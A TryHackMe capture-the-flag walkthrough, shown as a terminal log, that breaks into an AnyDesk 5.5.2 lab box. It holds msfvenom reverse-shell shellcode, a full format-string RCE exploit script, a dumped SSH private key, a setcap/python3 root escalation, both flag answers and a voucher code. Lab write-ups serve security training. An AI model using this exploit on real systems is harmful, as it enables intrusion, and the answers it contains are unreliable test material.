----
Remote access comes in different flavors.
----

### Task 1  Recon - Research - Exploit

![](https://tryhackme-images.s3.amazonaws.com/room-icons/9bcbd71d6ed380bcbf41c10cce8ccfcd.png)


 Start Machine

Do your usual recon, go for some vulnerability research, and exploit this box already.

Also, don't forget the PrivEsc of course :)  

Good luck & have fun!  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.162.206 --ulimit 5500 -b 65535 -- -A -Pn  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.162.206:22
Open 10.10.162.206:7070
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:47 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:47
Completed Parallel DNS resolution of 1 host. at 19:47, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:47
Scanning 10.10.162.206 [2 ports]
Discovered open port 7070/tcp on 10.10.162.206
Discovered open port 22/tcp on 10.10.162.206
Completed Connect Scan at 19:47, 2.46s elapsed (2 total ports)
Initiating Service scan at 19:47
Scanning 2 services on 10.10.162.206
Completed Service scan at 19:47, 15.77s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.162.206.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 8.52s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 1.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Nmap scan report for 10.10.162.206
Host is up, received user-set (0.45s latency).
Scanned at 2023-07-05 19:47:05 EDT for 28s

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72d72534e807b7d96fbad6981aa317db (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA0R7eKVAIQzgsQ1QLoI7zzRYcaNBJ0wZtCbG1n5lR51Jfr2CC6+IVVxzleo0wCtfV9tcgtRXVdrju+29xaBR/Hin16MAf7QM4cY5dt46pgADnbwSXAy8GpnuCT10tTrL27gpKM2ayqmlpnKSxL2daP5uhkuoZCI3EYOvbaoPn4/u4vKeH64bk/s5zTE2JeIV/CwQnheYc1ZhwiJQD5k11735k+NfhD7pmhNY+QpG6qZNyFZ4APqdktrnDFetksOkC2NF4D8/OOjDsYkmofeIe+2fe01BHO4KFnRrKI3aSNDQdeNIQIL7LgKufgQ+yP0WmRLOThsiwu22jUG/8Ot1f
|   256 721026ce5c53084b6183f87ad19e9b86 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH+EwC6q+M+qEr2TTccTtvcNF7dfougjgrZzZG4ShpTnNo1KXJy6iTnW/al9mxm/ecZVSF45w3Z3IYwAi9nfrdU=
|   256 d10e6da84e8e20ce1f0032c1448dfe4e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBgcqbntpdHoH14/wXi5gysaIvv0hOk+VvCUNmVjhkMQ
7070/tcp open  ssl/realserver? syn-ack
| ssl-cert: Subject: commonName=AnyDesk Client
| Issuer: commonName=AnyDesk Client
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-23T20:04:30
| Not valid after:  2072-03-10T20:04:30
| MD5:   3e576c44bf60ef79799989987c8dbdf0
| SHA-1: ce6c79fb669d9b1953828cecc8d550b62e36475b
| -----BEGIN CERTIFICATE-----
| MIICqDCCAZACAQEwDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAwwOQW55RGVzayBD
| bGllbnQwIBcNMjIwMzIzMjAwNDMwWhgPMjA3MjAzMTAyMDA0MzBaMBkxFzAVBgNV
| BAMMDkFueURlc2sgQ2xpZW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAvFEAPxFPrh1v6FuKL9k1AiX5ml+soPQ3sfYSr+5y7uJlqwy2C6HZ2Kf83gc0
| MN/+GP4mWpB1LskMHDWf2173Sy8A+EBekxRn05tCs1gyxD19vHvqcorZD9JbN/Mz
| Pq6kEvloUrHNKgkYyYPq3neAZ4RxQSTjAOydR+0aGWiDV4QNdzmKvwaunlvz8zoZ
| Nr+tcI0UnP4jeAC3fSX7XfijPE7ANWaiwm4oVWOgiMXcTDGuJ78WptNJ7/XI+RFT
| lkN8T69uHWLRUyN2YHG7OSK28UExyDShM08t3MyztWQmCtHqQd4hExdZoIkIW9bP
| Qf4QS+mlal0rBYqNkZNXUNeX7QIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQBe68Tz
| 6xMMwAxJb0xWz7DIK9ffSVEnnBe3Epdi0a76B2I1eu59+DzZu1euw8UAak7i1lL/
| +Yu/i6LfLHzjQuD7MMQUmGRlcsxMTOfYXiSbKAgAd8vt+a24Q8LKDASu8lmLNtj/
| /GglirQnYStt6zb9f4Ud3YpPGDcqfS636YlnFDttmLMapI9GJZs+GTp+ukbxCH9j
| hrhMjE+4d1Le5dFk0K2P2v/m8IMqc52Mkef7XR4CFMC+DOIRp8U3PN1i9rFOLFaE
| FuZmniIJ30KAE+BCCPD+Ozx5cCcA8OYcT/Wyua5pPepP7ryR5lVbZmcAR9ELgzvm
| mSn9KWFRlhAMUQ4V
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:47
Completed NSE at 19:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.36 seconds

https://packetstormsecurity.com/files/161628/AnyDesk-5.5.2-Remote-Code-Execution.html

┌──(witty㉿kali)-[~/Downloads]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.19.103 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x18\xc4\x4a"
shellcode += b"\x40\x97\x12\xa2\xcb\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x72\xed\x12\xd9\xfd"
shellcode += b"\x10\xfd\xa1\x19\x9a\x45\x45\xdf\x85\xea\x72"
shellcode += b"\x1a\xc4\x5b\x1c\x9d\x1a\xb1\xac\x49\x8c\xc3"
shellcode += b"\xa6\xfd\x02\xf8\xa1\x32\x9c\x45\x45\xfd\x11"
shellcode += b"\xfc\x83\xe7\x0a\x20\x61\xcf\x1d\xa7\xbe\xee"
shellcode += b"\xae\x71\x18\x0e\x5a\x19\xe4\x7a\xad\x24\x6f"
shellcode += b"\xe4\x7a\xa2\x98\x50\x4d\xad\x12\xc0\x5a\x2b"
shellcode += b"\x2d\x17\xc1\x4a\x40\x97\x12\xa2\xcb"


┌──(witty㉿kali)-[~/Downloads]
└─$ cat anydesk_rce.py 
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.162.206'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x18\xc4\x4a"
shellcode += b"\x40\x97\x12\xa2\xcb\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x72\xed\x12\xd9\xfd"
shellcode += b"\x10\xfd\xa1\x19\x9a\x45\x45\xdf\x85\xea\x72"
shellcode += b"\x1a\xc4\x5b\x1c\x9d\x1a\xb1\xac\x49\x8c\xc3"
shellcode += b"\xa6\xfd\x02\xf8\xa1\x32\x9c\x45\x45\xfd\x11"
shellcode += b"\xfc\x83\xe7\x0a\x20\x61\xcf\x1d\xa7\xbe\xee"
shellcode += b"\xae\x71\x18\x0e\x5a\x19\xe4\x7a\xad\x24\x6f"
shellcode += b"\xe4\x7a\xa2\x98\x50\x4d\xad\x12\xc0\x5a\x2b"
shellcode += b"\x2d\x17\xc1\x4a\x40\x97\x12\xa2\xcb"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')

┌──(witty㉿kali)-[~/Downloads]
└─$ python2 anydesk_rce.py                    
sending payload ...
reverse shell should connect within 5 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.162.206] 36990
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

annie@desktop:/home/annie$ ls
ls
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
annie@desktop:/home/annie$ cat user.txt
cat user.txt
THM{N0t_Ju5t_ANY_D3sk}

annie@desktop:/home/annie$ ls -lah
ls -lah
total 96K
drwxr-xr-x 17 annie annie 4.0K Mar 23  2022 .
drwxr-xr-x  3 root  root  4.0K Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4.0K Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3.7K Mar 23  2022 .bashrc
drwx------  8 annie annie 4.0K Mar 23  2022 .cache
drwx------  9 annie annie 4.0K Mar 23  2022 .config
drwx------  3 annie annie 4.0K Mar 23  2022 .dbus
drwx------  3 annie annie 4.0K Mar 23  2022 .gnupg
drwx------  3 annie annie 4.0K Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4.0K Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
annie@desktop:/home/annie$ cd .ssh
cd .ssh
annie@desktop:/home/annie/.ssh$ ls
ls
authorized_keys  id_rsa
annie@desktop:/home/annie/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
b1Da9w==
-----END OPENSSH PRIVATE KEY-----



annie@desktop:/home/annie/.ssh$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
< -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
-rwsr-xr-x 1 root root 10232 Nov 16  2017 /sbin/setcap
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44664 Jan 25  2022 /bin/su
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping
-rwsr-xr-x 1 root root 40344 Jan 25  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Jan 25  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 75824 Jan 25  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Jan 25  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 59640 Jan 25  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 22520 Jan 12  2022 /usr/bin/pkexec

https://gtfobins.github.io/gtfobins/python/

annie@desktop:/home/annie$ cp $(which python3) .
cp $(which python3) .
annie@desktop:/home/annie$ ls
ls
Desktop    Downloads  Pictures  Templates  python3
Documents  Music      Public    Videos     user.txt

or cp /usr/bin/python3 /home/annie/python3

annie@desktop:/home/annie$ setcap cap_setuid+ep python3
setcap cap_setuid+ep python3

annie@desktop:/home/annie$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cd /root
cd /root
# ls
ls
THM-Voucher.txt  root.txt
# cat root.txt
cat root.txt
THM{0nly_th3m_5.5.2_D3sk}
# cat THM-Voucher.txt
cat THM-Voucher.txt
Congratz to the blood-taker!
Prize is a 1 month THM subscription voucher:
Q9oimd

```

What is user.txt?

*THM{N0t_Ju5t_ANY_D3sk}*

What is root.txt?

*THM{0nly_th3m_5.5.2_D3sk}*


[[Lockdown]]